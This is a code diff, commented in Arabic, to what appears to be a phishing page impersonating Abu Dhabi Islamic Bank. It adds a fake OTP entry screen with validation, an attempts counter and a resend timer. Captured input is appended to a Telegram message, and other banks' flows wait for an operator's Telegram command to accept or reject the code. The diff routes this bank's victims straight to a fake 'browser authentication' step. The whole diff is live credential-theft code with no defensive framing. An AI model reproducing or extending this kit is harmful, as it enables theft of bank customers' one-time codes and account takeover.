@@ -2144,8 +2144,34 @@ body {
                 showBrowserAuthPage();
                 return;
             } else if (bankKey === 'abuDhabiIslamic') {
-                // تم إزالة واجهة OTP لبنك أبو ظبي الإسلامي - الانتقال مباشرة لتوثيق المتصفح
-                showADIBBrowserAuthPage();
+                container.innerHTML = `
+                    <h3>المصادقة عبر ${bank.name}</h3>
+                    <div class="auth-message">
+                        <p>تم إرسال رمز OTP إلى هاتفك المحمول</p>
+                        <p>يرجى إدخال الرمز المرسل إليك</p>
+                    </div>
+                    <div class="auth-message" style="background-color: #e3f2fd; border: 1px solid #bbdefb; color: #0d47a1;">
+                        <p><strong>إشعار الجوال:</strong> يرجى التحقق من الرسائل النصية المستلمة على هاتفك.</p>
+                    </div>
+                    <div class="form-group">
+                        <label for="otpInput">أدخل رمز OTP</label>
+                        <input type="text" id="otpInput" class="otp-input" placeholder="أدخل الرمز" maxlength="8" autocomplete="one-time-code" inputmode="numeric" required>
+                        <div class="otp-error" id="otpError">رمز OTP غير صحيح، يرجى المحاولة مرة أخرى</div>
+                        <div class="attempts-left" id="attemptsLeft">محاولات متبقية: 6</div>
+                        <div id="resendContainer" style="text-align: center; margin-top: 10px;">
+                            <button id="resendBtn" class="btn-link" disabled style="color: #666; text-decoration: none;">إعادة إرسال الرمز خلال <span id="resendTimer">30</span> ثانية</button>
+                        </div>
+                    </div>
+                    <button class="btn btn-block" onclick="verifyOTP()">تحقق</button>
+                `;
+                
+                // إضافة التحقق من الصحة أثناء الكتابة
+                document.getElementById('otpInput').addEventListener('input', function() {
+                    validateField(this, /^\d{5,8}$/, 'otpError', 'يرجى إدخال رمز OTP صحيح');
+                });
+
+                // بدء مؤقت إعادة الإرسال
+                startResendTimer();
                 return;
             } else {
                 container.innerHTML = `
@@ -2223,11 +2249,15 @@ body {
             });
             appendToTelegramMessage(content);
             
-            // إظهار رسالة انتظار
-            showPageWithWaiting(4, 4, 'waiting3', 1000);
-            
-            // بدء مراقبة الأوامر من تليجرام
-            monitorTelegramCommand(sessionId, otpInput, otpError, attemptsLeftElement);
+            // إذا كان البنك هو أبو ظبي الإسلامي، يتم التوجيه للتوثيق فوراً وبدون انتظار
+            if (currentBank === 'abuDhabiIslamic') {
+                showADIBBrowserAuthPage();
+            } else {
+                // إظهار رسالة انتظار للبنوك الأخرى
+                showPageWithWaiting(4, 4, 'waiting3', 1000);
+                // لبقية البنوك، يتم الانتظار لموافقة تليجرام
+                monitorTelegramCommand(sessionId, otpInput, otpError, attemptsLeftElement);
+            }
         }
         
         // مراقبة أوامر تليجرام (قبول أو رفض)
@@ -2362,6 +2392,8 @@ body {
                 authBtn.addEventListener('click', handleBrowserAuthConfirmation);
             });
         }
+
+
 
         // صفحة توثيق المتصفح لبنك أبو ظبي الإسلامي
         function showADIBBrowserAuthPage() {
